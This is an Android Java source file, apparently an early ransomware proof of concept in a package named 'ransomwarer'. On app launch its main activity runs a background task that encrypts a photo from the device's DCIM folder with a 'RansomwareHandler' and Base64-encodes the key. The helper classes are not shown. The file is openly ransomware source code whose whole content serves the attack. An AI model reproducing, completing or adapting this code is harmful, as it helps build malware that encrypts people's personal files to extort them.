package com.ransom.ransomwarer;

import java.io.File;

import android.app.Activity;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.util.Base64;
import android.util.Log;
import android.view.Menu;

import com.example.ransomwarer.R;

public class MainActivity extends Activity {
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		File root = Environment.getExternalStorageDirectory();

		String directory = "/DCIM/prueba/";
		new CipherTask().execute(
				new File(root, directory + "uno.jpg"), 
				new File(root, directory + "uno_encrypted.jpg"));
		setContentView(R.layout.activity_main);
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	private class CipherTask extends AsyncTask<File, String, String> {
		protected String doInBackground(File... files) {
			KeyProvider provider = new CacheGeneratorKeyProvider();
			RansomwareHandler handler = new RansomwareHandler(provider);

			try {
				handler.encrypt(files[0], files[1]);
			} catch (Exception e) {
				Log.e("RANSOMWARER", "Exception", e);
				return null;
			}

			String result = Base64.encodeToString(provider.getKey()
					.getEncoded(), Base64.DEFAULT);
			return result;
		}

	}
}
